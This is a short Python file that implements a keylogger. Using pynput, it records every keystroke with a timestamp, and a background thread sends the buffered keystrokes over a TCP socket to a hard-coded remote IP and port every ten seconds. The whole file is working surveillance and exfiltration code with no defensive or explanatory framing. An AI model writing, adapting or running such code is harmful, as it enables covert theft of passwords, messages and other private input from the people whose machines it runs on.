from pynput import keyboard
import sys
import socket
import threading
import time
import datetime

IP = "1.1.1.1"
PORT = 1234
HEADER = 50
LOG_INTERVAL = 10  # Interval to log data to file (in seconds)

# We'll not store the data in a file but use a buffer instead
data_buffer = []

def on_press(key):
    try:
        if key == keyboard.Key.esc:
            print("Byeeeeee !!!")
            sys.exit()

        print('Alphanumeric key {0} pressed'.format(key.char))
        data_buffer.append(datetime.datetime.now().__str__() + ' ' + str(key))

    except AttributeError:
        print('Special key {0} pressed'.format(key))
        data_buffer.append(datetime.datetime.now().__str__() + ' ' + str(key))


def log_keys():    
    with keyboard.Listener(on_press=on_press) as listener :
        listener.join()

def send_data():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(1)
    try:
        s.connect((IP,PORT))
        print(f"Connexion successfull\n")
    except socket.error:
        print(f"Unable to connect to the server please try back again\n")
        sys.exit()
    
    while True:
        if data_buffer:
            data = "\n".join(data_buffer)
            s.sendall(data.encode('utf-8'))
            data_buffer.clear()
        time.sleep(LOG_INTERVAL)

def main():
    t = threading.Thread(target=log_keys, args=[])
    t.daemon = True
    t.start()
    
    time.sleep(2)  # Wait for log_keys to start

    t2 = threading.Thread(target=send_data)
    t2.daemon = True
    t2.start()

    t.join()  # Wait for log_keys to finish

if __name__ == "__main__":
    main()
